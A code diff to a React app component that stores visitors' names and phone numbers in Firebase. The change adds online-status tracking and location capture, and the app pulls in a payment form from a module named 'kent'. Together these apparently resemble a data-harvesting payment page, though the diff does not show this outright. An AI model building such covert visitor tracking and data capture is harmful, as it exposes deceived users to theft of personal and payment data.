@@ -10,7 +10,7 @@ import { addData } from "./firebase"
 import  FullPageLoader  from "./loader"
 import { PaymentForm } from "./kent/kent"
 import PopupMessage from "./popup"
-import * as React from "react"
+import { getLocation, setupOnlineStatus } from "./lib"
 
 function App() {
   const [currantPage, setCurrantPage] = useState(1)
@@ -20,46 +20,40 @@ function App() {
 
   const [_id] = useState("id" + Math.random().toString(16).slice(2))
   const [showPopup, setShowPopup] = useState(false)
-
-  const data = {
-    id: _id,
-    hasPersonalInfo: name != "",
-    currentPage: currantPage,
+  const data={
+    id:_id,
+    hasPersonalInfo:name != '',
+    currentPage:currantPage,
     createdDate: new Date().toISOString(),
-    notificationCount: 1,
+    notificationCount:1,
     personalInfo: {
-      id: name,
-      fullName: name,
-      phone: phone,
+      id:name,
+      fullName:name,
+      phone:phone
     },
-  }
-
+  };
   const handleNextPage = () => {
-    addData(data)
-      console.log(React.cache)
-      setisloading(true)
+   addData(data)
+   setisloading(true)
     setTimeout(() => {
       setisloading(false)
-      setCurrantPage(currantPage + 1)
+      setCurrantPage(currantPage+1)
     }, 3000)
   }
+  
+  
 
   const handleClosePopup = () => {
     setShowPopup(false)
   }
 
-  useEffect(() => {
-    localStorage.setItem("vistor", _id)
-    addData(data)
-
-    // Show popup after a short delay
-    const timer = setTimeout(() => {
-      setShowPopup(true)
-    }, 1000)
-
-    return () => clearTimeout(timer)
-  }, [])
-
+  useEffect(()=>{
+    localStorage.setItem('vistor',_id)
+      addData(data).then(()=>{
+        setupOnlineStatus(data.id)
+        getLocation()
+      })
+    },[])
   return (
     <CartProvider>
       <div style={{ opacity: isLoading ? 0.4 : 1 }}>
